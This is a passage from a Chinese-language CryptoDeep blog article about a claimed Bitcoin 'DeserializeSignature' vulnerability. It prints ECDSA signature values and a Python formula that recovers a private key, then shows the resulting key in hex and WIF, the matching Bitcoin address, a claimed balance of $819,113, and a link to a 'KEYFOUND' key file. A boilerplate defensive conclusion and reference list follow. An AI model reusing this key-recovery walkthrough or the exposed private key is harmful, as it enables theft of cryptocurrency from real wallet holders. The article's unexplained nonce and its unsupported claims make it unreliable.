R = 0xb44a31bd81d3c596cc4d3776263229b6f52f2a729fbcafefffc9a0d955d46307
S = 0x74e5feb333400732256fc44a681a1ba262b080a7cc5dfa11894e7ce4d9766c6f
Z = 0xa79974cb42f82890fcebcb9865cd512a34479d91211e2ce383def10a7388cf63


print (h((((S * K) - Z) * modinv(R,N)) % N))</strong></code></pre>
<!-- /wp:code -->

<!-- wp:heading -->
<h2 class="wp-block-heading">该脚本<code><a href="https://github.com/demining/CryptoDeepTools/blob/main/32DeserializeSignatureVulnerability/calculate.py" target="_blank" rel="noreferrer noopener">calculate.py</a></code>将使用以下公式计算私钥：</h2>
<!-- /wp:heading -->

<!-- wp:paragraph -->
<p><code>Privkey = ((((S * K) - Z) * modinv(R,N)) % N)</code></p>
<!-- /wp:paragraph -->

<!-- wp:quote -->
<blockquote class="wp-block-quote"><!-- wp:paragraph -->
<p><strong>让我们运行脚本：</strong></p>
<!-- /wp:paragraph --></blockquote>
<!-- /wp:quote -->

<!-- wp:image {"id":5251} -->
<figure class="wp-block-image"><img src="https://cryptodeep.ru/wp-content/uploads/2024/05/image-38.png" alt="比特币网络中的 DeserializeSignature 漏洞：密码分析、后果以及创建无效 ECDSA 签名的可能性" class="wp-image-5251"/></figure>
<!-- /wp:image -->

<!-- wp:paragraph -->
<p><code><strong>PrivKey = 0506b0b7b508625dc7b0623db41206c48058ede0a9c75ff265eeb47fea29b3f0</strong></code></p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p>让我们打开<strong><a href="https://cryptodeep.ru/bitaddress.html" target="_blank" rel="noreferrer noopener">bitaddress</a></strong>并检查：</p>
<!-- /wp:paragraph -->

<!-- wp:code -->
<pre class="wp-block-code"><code><strong>ADDR: 1LdNN9GXmoKZs5vrQFL1d4NL9GgZ1PfCZk
WIF:  5HrVy4SVvC46tsuBhMhVEGHXG4AzhxtEqi4FLbia5vAXuF5GwaX
HEX:  0506b0b7b508625dc7b0623db41206c48058ede0a9c75ff265eeb47fea29b3f0</strong></code></pre>
<!-- /wp:code -->

<!-- wp:image {"id":5165} -->
<figure class="wp-block-image"><img src="https://cryptodeep.ru/wp-content/uploads/2024/05/image-11.png" alt="比特币网络中的 DeserializeSignature 漏洞：密码分析、后果以及创建无效 ECDSA 签名的可能性" class="wp-image-5165"/></figure>
<!-- /wp:image -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:paragraph -->
<p><a href="https://www.blockchain.com/btc/address/1LdNN9GXmoKZs5vrQFL1d4NL9GgZ1PfCZk">https://www.blockchain.com/btc/address/1LdNN9GXmoKZs5vrQFL1d4NL9GgZ1PfCZk</a></p>
<!-- /wp:paragraph -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:heading {"level":1} -->
<h1 class="wp-block-heading"><a href="https://github.com/demining/CryptoDeepTools/blob/main/32DeserializeSignatureVulnerability/KEYFOUND.privkey" target="_blank" rel="noreferrer noopener">私钥已收到！</a></h1>
<!-- /wp:heading -->

<!-- wp:image {"id":5255} -->
<figure class="wp-block-image"><img src="https://cryptodeep.ru/wp-content/uploads/2024/05/image-40.png" alt="比特币网络中的 DeserializeSignature 漏洞：密码分析、后果以及创建无效 ECDSA 签名的可能性" class="wp-image-5255"/></figure>
<!-- /wp:image -->

<!-- wp:image {"id":5256} -->
<figure class="wp-block-image"><img src="https://cryptodeep.ru/wp-content/uploads/2024/05/image-41.png" alt="比特币网络中的 DeserializeSignature 漏洞：密码分析、后果以及创建无效 ECDSA 签名的可能性" class="wp-image-5256"/></figure>
<!-- /wp:image -->

<!-- wp:paragraph -->
<p><a href="https://www.blockchain.com/explorer/addresses/btc/1LdNN9GXmoKZs5vrQFL1d4NL9GgZ1PfCZk">https://www.blockchain.com/explorer/addresses/btc/1LdNN9GXmoKZs5vrQFL1d4NL9GgZ1PfCZk</a></p>
<!-- /wp:paragraph -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:paragraph -->
<p><code><strong>BALANCE: $ 819113</strong></code></p>
<!-- /wp:paragraph -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:heading -->
<h2 class="wp-block-heading">结论</h2>
<!-- /wp:heading -->

<!-- wp:quote -->
<blockquote class="wp-block-quote"><!-- wp:paragraph -->
<p>本文讨论了分析DeserializeSignature漏洞的主要方法和工具。使用静态和动态分析以及使用机器学习的模糊测试，<code>BitcoinChatGPT</code>使我们能够识别和消除软件开发和运营各个阶段的漏洞。比特币中的DeserializeSignature漏洞对网络安全构成严重威胁。然而，该领域的积极研究和开发为提高保护水平开辟了新的前景。改进算法、使用机器学习、制定安全标准和教育计划可以显着降低风险并确保系统可靠运行。该研究强调了在快速发展的加密货币领域持续监控和更新安全系统的必要性。遵循针对开发人员和用户的建议将有助于显着降低风险并保护资金免受潜在攻击。重要的是要记住，安全是一个持续的过程，需要持续关注和更新知识。加密货币安全领域当前和未来的发展将旨在消除已发现的问题并防止新的威胁，这将确保加密货币系统更加可靠和安全的运行。所获得结果的意义在于识别系统的关键缺陷并提出有效的解决方案来消除它们。对结果的解读表明，消除该漏洞是提高加密货币安全性和信任度的重要一步。 DeserializeSignature 过程对于确保比特币交易的安全至关重要。此过程实施不当可能会导致严重的漏洞和攻击。仔细检查签名组件的格式和值、使用可靠的库并注意可能的运行时攻击非常重要。这是确保加密货币交易得到可靠保护的唯一方法。</p>
<!-- /wp:paragraph --></blockquote>
<!-- /wp:quote -->

<!-- wp:heading {"level":3} -->
<h3 class="wp-block-heading">1. 改进数据验证</h3>
<!-- /wp:heading -->

<!-- wp:paragraph -->
<p>主要解决方案之一是改进反序列化期间的数据验证过程。这包括：</p>
<!-- /wp:paragraph -->

<!-- wp:list -->
<ul><!-- wp:list-item -->
<li>数据格式检查：在处理数据之前确保数据是预期的格式。</li>
<!-- /wp:list-item -->

<!-- wp:list-item -->
<li>使用严格的数据类型：使用严格的数据类型来防止反序列化过程中出现错误。</li>
<!-- /wp:list-item -->

<!-- wp:list-item -->
<li>数据长度检查：验证数据长度是否符合预期。</li>
<!-- /wp:list-item --></ul>
<!-- /wp:list -->

<!-- wp:heading {"level":3} -->
<h3 class="wp-block-heading">2. 使用安全库</h3>
<!-- /wp:heading -->

<!-- wp:paragraph -->
<p>使用经过验证且安全的数据反序列化库可以显着降低漏洞风险。此类库必须经过开发人员社区的彻底测试和支持。</p>
<!-- /wp:paragraph -->

<!-- wp:heading {"level":3} -->
<h3 class="wp-block-heading">3、多级认证的实现</h3>
<!-- /wp:heading -->

<!-- wp:paragraph -->
<p>多级身份验证有助于防止未经授权的系统访问。这包括：</p>
<!-- /wp:paragraph -->

<!-- wp:list -->
<ul><!-- wp:list-item -->
<li>双因素身份验证 (2FA)：需要对用户身份进行额外验证。</li>
<!-- /wp:list-item -->

<!-- wp:list-item -->
<li>多重身份验证（MFA）：使用多种身份验证方法来提高安全性。</li>
<!-- /wp:list-item --></ul>
<!-- /wp:list -->

<!-- wp:heading {"level":3} -->
<h3 class="wp-block-heading">4.定期安全审计</h3>
<!-- /wp:heading -->

<!-- wp:paragraph -->
<p>定期进行安全审核可以让您在漏洞被攻击者利用之前识别并修复漏洞。这包括：</p>
<!-- /wp:paragraph -->

<!-- wp:list -->
<ul><!-- wp:list-item -->
<li>渗透测试：模拟攻击以识别系统中的弱点。</li>
<!-- /wp:list-item -->

<!-- wp:list-item -->
<li>代码修订：分析源代码以检测潜在的漏洞。</li>
<!-- /wp:list-item --></ul>
<!-- /wp:list -->

<!-- wp:heading {"level":3} -->
<h3 class="wp-block-heading">5. 更新和修补</h3>
<!-- /wp:heading -->

<!-- wp:paragraph -->
<p>定期更新和修补软件是安全的一个关键方面。这包括：</p>
<!-- /wp:paragraph -->

<!-- wp:list -->
<ul><!-- wp:list-item -->
<li>更新库和依赖项：确保使用的所有库和依赖项都更新到最新版本。</li>
<!-- /wp:list-item -->

<!-- wp:list-item -->
<li>漏洞修补：快速修复已发现的漏洞。</li>
<!-- /wp:list-item --></ul>
<!-- /wp:list -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:heading -->
<h2 class="wp-block-heading">参考：</h2>
<!-- /wp:heading -->

<!-- wp:list {"ordered":true} -->
<ol><!-- wp:list-item -->
<li><em><strong><a href="https://cryptodeep.ru/doc/1-mastering-bitcoin-by-andreas-m-antonopoulos-security-and-vulnerability-review-and-analysis.pdf" target="_blank" rel="noreferrer noopener">安德烈亚斯·M·安东诺普洛斯（Andreas M. Antonopoulos）的</a></strong>《掌握比特币》&nbsp;——这是关于比特币最著名的书籍之一，涵盖了包括安全性和漏洞在内的许多方面。</em></li>
<!-- /wp:list-item -->

<!-- wp:list-item -->
<li><em><strong><a href="https://cryptodeep.ru/doc/2-bitcoin-and-cryptocurrency-technologies.pdf" target="_blank" rel="noreferrer noopener">《比特币和加密货币技术》</a></strong>作者：Arvind Narayanan、Joseph Bonneau、Edward Felten、Andrew Miller 和 Steven Goldfeder – 这本书深入了解了比特币和其他加密货币的底层技术，包括安全问题。</em></li>
<!-- /wp:list-item -->

<!-- wp:list-item -->
<li><em><strong><a href="https://cryptodeep.ru/doc/3-bitcoin-developer-documentation.pdf" target="_blank" rel="noreferrer noopener">比特币开发者文档</a></strong>– 比特币开发者的官方文档，可在 bitcoin.org 网站上获取。它包括有关各种安全方面和漏洞的信息。</em></li>
<!-- /wp:list-item -->

<!-- wp:list-item -->
<li><em><strong><a href="https://cryptodeep.ru/doc/4-bitcoin-improvement-proposals-bips.pdf" target="_blank" rel="noreferrer noopener">比特币改进提案 (BIP)</a></strong>&nbsp;– 描述比特币协议的各种改进和更改的文档。其中一些与安全和漏洞有关。 BIP 列表可以在 bitcoin.org 上找到。</em></li>
<!-- /wp:list-item -->

<!-- wp:list-item -->
<li><em><strong><a href="https://cryptodeep.ru/doc/5--research-on-anonymity-and-security-of-transactions-in-the-bitcoin-network-a-fistful-of-bitcoins-characterizing-payments-among-men-with-no-names.pdf" target="_blank" rel="noreferrer noopener"></a></strong>Sarah Meiklejohn 等人的<strong><a href="https://cryptodeep.ru/doc/5--research-on-anonymity-and-security-of-transactions-in-the-bitcoin-network-a-fistful-of-bitcoins-characterizing-payments-among-men-with-no-names.pdf" target="_blank" rel="noreferrer noopener">“一把比特币：描述无名男子的支付方式”</a></strong>&nbsp;。 – 本文探讨了比特币网络上交易的匿名性和安全性。</em></li>
<!-- /wp:list-item -->

<!-- wp:list-item -->
<li><em><strong><a href="https://cryptodeep.ru/doc/6-bitcoin-a-peer-to-peer-electronic-cash-system-by-satoshi-nakamoto-original-white-paper-describing-the-concept-of-bitcoin.pdf" target="_blank" rel="noreferrer noopener">中本聪的《比特币：点对点电子现金系统》</a></strong>&nbsp;——描述比特币概念的原始白皮书。尽管它不关注漏洞，但它是理解系统的基础文档。</em></li>
<!-- /wp:list-item -->

<!-- wp:list-item -->
<li><em><strong><a href="https://cryptodeep.ru/doc/7-security-and-privacy-in-the-bitcoin-network-research-by-malte-moser.pdf" target="_blank" rel="noreferrer noopener">Malte Möser 的《比特币安全与隐私》</a></strong>&nbsp;——探讨比特币网络安全和隐私各个方面的论文。</em></li>
<!-- /wp:list-item -->

<!-- wp:list-item -->
<li><em><strong><a href="https://cryptodeep.ru/doc/8-security-issues-in-bitcoin-and-blockchain-technologies-dissertation-by-ghassan-o-karame.pdf" target="_blank" rel="noreferrer noopener">Ghassan O. Karame 的“比特币和区块链安全”</a></strong>&nbsp;——关于比特币和区块链技术安全问题的论文。</em></li>
<!-- /wp:list-item --></ol>
<!-- /wp:list -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:paragraph -->
<p><a href="https://dzen.ru/embed/vqOZbDlW4tBs?from_block=partner&amp;from=zen&amp;mute=0&amp;autoplay=0&amp;tv=0">https://dzen.ru/embed/vqOZbDlW4tBs?from_block=partner&amp;from=zen&amp;mute=0&amp;autoplay=0&amp;tv=0</a></p>
<!-- /wp:paragraph -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:paragraph -->
<p>本材料是为&nbsp;<a href="https://cryptodeep.ru/" target="_blank" rel="noreferrer noopener">CRYPTO DEEP TECH</a>门户创建的&nbsp;，旨在确保数据和椭圆曲线加密&nbsp;<a href="https://www.youtube.com/@cryptodeeptech" target="_blank" rel="noreferrer noopener">secp256k1</a>的财务安全&nbsp;，防止&nbsp;<a href="https://t.me/cryptodeeptech" target="_blank" rel="noreferrer noopener">比特币</a>加密货币&nbsp;中的&nbsp;弱<a href="https://github.com/demining/CryptoDeepTools" target="_blank" rel="noreferrer noopener">ECDSA</a>签名。该软件的创建者不对材料的使用负责。<a href="https://t.me/cryptodeeptech" target="_blank" rel="noreferrer noopener"></a></p>
<!-- /wp:paragraph -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:paragraph -->
<p><strong><a href="https://github.com/demining/CryptoDeepTools/tree/main/32DeserializeSignatureVulnerability" target="_blank" rel="noreferrer noopener">来源</a></strong></p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p><strong><a href="https://colab.research.google.com/drive/1EiIIJh8UCOZZ8DVbelxhESFPvqu_xZUo" target="_blank" rel="noreferrer noopener">谷歌合作实验室</a></strong></p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p><strong><a href="https://attacksafe.ru/ultra" target="_blank" rel="noreferrer noopener">攻击安全超</a></strong></p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p><strong><a href="https://t.me/cryptodeeptech" target="_blank" rel="noreferrer noopener">电报：https://t.me/cryptodeeptech</a></strong></p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p><strong><a href="https://youtu.be/8E2KJeWu4XA" target="_blank" rel="noreferrer noopener">视频素材：https://youtu.be/8E2KJeWu4XA</a></strong></p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p><strong><a href="https://dzen.ru/video/watch/664e34fc8df6514b10da09e9" target="_blank" rel="noreferrer noopener">Dzen 视频教程：https://dzen.ru/video/watch/664e34fc8df6514b10da09e9</a></strong></p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p><strong><a href="https://cryptodeep.ru/deserialize-signature-vulnerability-bitcoin" target="_blank" rel="noreferrer noopener">来源：https://cryptodeep.ru/deserialize-signature-vulnerability-bitcoin</a></strong></p>
<!-- /wp:paragraph -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:image {"id":5187} -->
<figure class="wp-block-image"><img src="https://cryptodeep.ru/wp-content/uploads/2024/05/053-1-1024x576.png" alt="比特币网络中的 DeserializeSignature 漏洞：密码分析、后果以及创建无效 ECDSA 签名的可能性" class="wp-image-5187"/></figure>
<!-- /wp:image -->

<!-- wp:separator -->
<hr class="wp-block-separator has-alpha-channel-opacity"/>
<!-- /wp:separator -->

<!-- wp:paragraph -->
<p>&nbsp;<a href="https://cryptodeep.ru/category/%d0%ba%d1%80%d0%b8%d0%bf%d1%82%d0%be%d0%b0%d0%bd%d0%b0%d0%bb%d0%b8%d0%b7/">密码分析</a></p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p></p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p></p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p></p>
<!-- /wp:paragraph -->

<!-- wp:paragraph -->
<p></p>
<!-- /wp:paragraph -->
